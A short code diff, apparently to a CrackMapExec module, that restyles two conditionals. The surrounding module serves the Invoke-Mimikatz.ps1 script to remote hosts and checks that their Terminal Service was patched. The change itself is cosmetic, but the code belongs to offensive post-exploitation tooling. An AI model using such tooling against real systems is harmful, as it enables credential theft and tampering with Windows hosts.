@@ -22,7 +22,7 @@ class CMEModule:
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
-        if 'Invoke-Mimikatz.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-Mimikatz.ps1':
             request.send_response(200)
             request.end_headers()
 
@@ -41,6 +41,5 @@ class CMEModule:
         #We've received the response, stop tracking this host
         response.stop_tracking_host()
 
-        if len(data):
-            if data.find('"TermService" service patched') != -1:
-                context.log.success("Terminal Service patched successfully")
+        if len(data) and data.find('"TermService" service patched') != -1:
+            context.log.success("Terminal Service patched successfully")
